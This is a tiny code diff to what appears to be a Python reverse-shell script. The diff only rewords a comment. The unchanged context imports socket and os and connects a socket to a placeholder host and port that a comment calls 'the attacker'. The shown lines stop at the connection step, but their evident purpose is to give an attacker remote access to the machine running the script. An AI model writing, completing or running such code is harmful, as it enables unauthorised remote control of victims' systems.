@@ -1,6 +1,6 @@
 import socket, os
 
-# Open a new socket and connect to the attacker
+# Open a new TCP socket and connect to the attacker
 sock = socket.socket()
 sock.connect(("*\host*", *\port*))
 
